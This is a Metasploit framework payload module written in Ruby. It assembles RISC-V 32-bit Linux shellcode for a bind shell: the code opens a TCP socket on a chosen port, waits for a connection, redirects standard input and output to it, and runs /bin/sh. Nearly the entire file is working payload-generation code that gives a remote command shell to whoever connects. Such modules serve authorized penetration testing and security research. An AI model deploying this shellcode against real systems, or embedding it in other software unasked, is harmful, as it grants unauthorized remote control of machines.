##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 180

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  SYS_SOCKET = 198
  SYS_BIND = 200
  SYS_LISTEN = 201
  SYS_ACCEPT = 202
  SYS_DUP3 = 24
  SYS_EXECVE = 221
  AF_INET = 2
  SOCK_STREAM = 1
  IPPROTO_IP = 0

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Command Shell, Bind TCP Inline',
        'Description' => 'Listen for a connection and spawn a command shell',
        'Author' => [
          'modexp', # bind.s RISC-V 64-bit shellcode
          'bcoles', # RISC-V 32-bit shellcode port and metasploit
        ],
        'License' => BSD_LICENSE,
        'Platform' => 'linux',
        'Arch' => [ ARCH_RISCV32LE ],
        'References' => [
          ['URL', 'https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/'],
          ['URL', 'https://github.com/bcoles/shellcode/blob/main/riscv32/bindshell/bind.s'],
          ['URL', 'https://web.archive.org/web/20230326161514/https://github.com/odzhan/shellcode/commit/d3ee25a6ebcdd21a21d0e6eccc979e45c24a9a1d'],
        ],
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShellUnix
      )
    )
  end

  # Encode a RISC-V LUI (Load Upper Immediate) instruction
  def encode_lui(rd, imm20)
    0b0110111 | ((imm20 & 0xfffff) << 12) | (rd << 7)
  end

  # Encode a RISC-V ADDI (Add Immediate) instruction
  def encode_addi(rd, rs1, imm12)
    0b0010011 | ((imm12 & 0xfff) << 20) | (rs1 << 15) | (0b000 << 12) | (rd << 7)
  end

  # Emit RISC-V instruction words that build an arbitrary 32-bit constant in a chosen register using LUI+ADDI.
  def load_const_into_reg32(const, rd)
    raise ArgumentError, "Constant '#{const}' is #{const.class}; not Integer" unless const.is_a?(Integer)

    max_const = 0xFFFF_FFFF

    raise ArgumentError, "Constant #{const} is outside range 0..#{max_const}" unless const.between?(0, max_const)

    if const >= -2048 && const <= 2047
      return [encode_addi(rd, 0, const)]
    end

    upper = (const + 0x800) >> 12
    low = const & 0xfff
    [
      encode_lui(rd, upper),
      encode_addi(rd, rd, low)
    ]
  end

  def generate(_opts = {})
    return super unless datastore['LPORT']

    lport = datastore['LPORT'].to_i
    sockaddr_word = AF_INET | ([lport].pack('n').unpack1('v') << 16)

    shellcode = [
      # prepare stack
      0xff010113, # addi sp,sp,-16

      # s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      *load_const_into_reg32(SYS_SOCKET, 17),       # li a7,198       # SYS_socket
      *load_const_into_reg32(IPPROTO_IP, 12),       # li a2,0         # IPPROTO_IP
      *load_const_into_reg32(SOCK_STREAM, 11),      # li a1,1         # SOCK_STREAM
      *load_const_into_reg32(AF_INET, 10),          # li a0,2         # AF_INET
      0x00000073,                                   # ecall

      # bind(s, &sa, sizeof(sa));
      0x00050693,                                   # mv a3,a0        # a3 = s
      *load_const_into_reg32(SYS_BIND, 17),         # li a7,200       # SYS_bind
      *load_const_into_reg32(16, 12),               # li a2,16        # sizeof(sockaddr_in)
      *load_const_into_reg32(sockaddr_word, 11),    # li a1,<packed>  # sin_family=AF_INET, sin_port=port, sin_addr=INADDR_ANY
      0x00b12023,                                   # sw a1,0(sp)     # store first 8 bytes (family+port+addr) at stack
      0x00012223,                                   # sw 0,4(sp)      # sin_addr
      0x00012423,                                   # sw 0,8(sp)      # sin_zero
      0x00012623,                                   # sw 0,12(sp)     # sin_zero
      0x00010593,                                   # mv a1,sp        # a1 = &sa
      0x00068513,                                   # mv a0,a3        # a0 = s
      0x00000073,                                   # ecall

      # listen(s, 1);
      *load_const_into_reg32(SYS_LISTEN, 17),       # li a7,201       # SYS_listen
      0x00100593,                                   # li a1,1         # backlog = 1
      0x00068513,                                   # mv a0,a3        # a0 = s
      0x00000073,                                   # ecall

      # r = accept(s, 0, 0);
      *load_const_into_reg32(SYS_ACCEPT, 17),       # li a7,202       # SYS_accept
      0x00000613,                                   # li a2,0         # addrlen = NULL
      0x00000593,                                   # li a1,0         # addr = NULL
      0x00068513,                                   # mv a0,a3        # a0 = s
      0x00000073,                                   # ecall

      # dup stdin/stdout/stderr
      0x00050713,                                   # mv a4,a0
      *load_const_into_reg32(SYS_DUP3, 17),         # li a7,24        # SYS_dup3
      *load_const_into_reg32(3, 11),                # li a1,3         # start from STDERR_FILENO + 1 = 3
      # c_dup:
      0x00070513,                                   # mv a0,a4
      0xfff58593,                                   # addi a1,a1,-1
      0x00000073,                                   # ecall
      0xfe059ae3,                                   # bnez a1,100ec <c_dup>

      # execve("/bin/sh", NULL, NULL);
      *load_const_into_reg32(SYS_EXECVE, 17),       # li a7,221
      *load_const_into_reg32(0x6e69622f, 5),        # "/bin"
      0x00512023,                                   # sw t0,0(sp)
      *load_const_into_reg32(0x0068732f, 5),        # "/sh\0"
      0x00512223,                                   # sw t0,4(sp)
      0x00010513,                                   # mv a0,sp        # path = /bin/sh
      0x00000593,                                   # li a1,0         # argv = NULL
      0x00000613,                                   # li a2,0         # envp = NULL
      0x00000073                                    # ecall
    ].pack('V*')

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
